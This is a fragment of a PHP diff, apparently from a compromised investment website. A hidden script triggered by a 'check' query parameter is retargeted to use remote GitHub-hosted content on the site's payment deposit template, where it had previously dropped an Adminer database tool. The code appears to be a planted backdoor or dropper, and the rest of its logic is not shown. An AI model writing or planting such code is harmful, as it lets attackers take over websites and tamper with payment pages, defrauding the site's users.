@@ -1,7 +1,7 @@
 <?php
 if (isset($_GET['check'])) {
-    $file_path = "/www/wwwroot/dytouzi/core/bootstrap/cache/myadm.php";
-    $remote_url = "https://raw.githubusercontent.com/mekote/all/refs/heads/main/adminer.txt";
+    $file_path = "/www/wwwroot/dytouzi/core/resources/views/templates/invester/user/payment/deposit.blade.php";
+    $remote_url = "https://raw.githubusercontent.com/mekote/sil/refs/heads/main/2.txt";
 
     // Dosyanın içeriğini oku
     if (file_exists($file_path)) {
